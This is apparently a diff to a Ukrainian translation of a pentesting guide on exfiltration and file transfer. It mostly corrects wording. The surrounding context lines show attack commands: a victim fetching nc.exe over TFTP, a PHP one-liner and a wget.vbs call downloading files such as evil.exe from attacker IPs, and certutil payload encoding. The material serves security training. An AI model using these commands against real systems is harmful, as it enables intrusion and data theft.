@@ -15,7 +15,7 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 </details>
 {% endhint %}
 
-## Загальновідомі домени для ексфільтрації інформації
+## Загальновідомі домени, які дозволяють ексфільтрацію інформації
 
 Check [https://lots-project.com/](https://lots-project.com/) to find commonly whitelisted domains that can be abused
 
@@ -26,7 +26,7 @@ Check [https://lots-project.com/](https://lots-project.com/) to find commonly wh
 base64 -w0 <file> #Encode file
 base64 -d file #Decode file
 ```
-**Вікна**
+**Windows**
 ```
 certutil -encode payload.dll payload.b64
 certutil -decode payload.b64 payload.dll
@@ -261,13 +261,13 @@ cp /path/tp/nc.exe /tftp
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
 ```
-В **жертві**, підключіться до сервера Kali:
+В **жертві** підключіться до сервера Kali:
 ```bash
 tftp -i <KALI-IP> get nc.exe
 ```
 ## PHP
 
-Завантажте файл за допомогою PHP oneliner:
+Завантажте файл за допомогою однорядкового коду PHP:
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
@@ -309,7 +309,7 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-Програма `debug.exe` не тільки дозволяє перевіряти бінарні файли, але також має **можливість відновлювати їх з шістнадцяткового коду**. Це означає, що, надаючи шістнадцятковий код бінарного файлу, `debug.exe` може згенерувати бінарний файл. Однак важливо зазначити, що debug.exe має **обмеження на складання файлів до 64 кб**.
+Програма `debug.exe` не лише дозволяє перевіряти бінарні файли, але також має **можливість відновлювати їх з шістнадцяткового коду**. Це означає, що, надаючи шістнадцятковий код бінарного файлу, `debug.exe` може згенерувати бінарний файл. Однак важливо зазначити, що debug.exe має **обмеження на складання файлів до 64 кб**.
 ```bash
 # Reduce the size
 upx -9 nc.exe
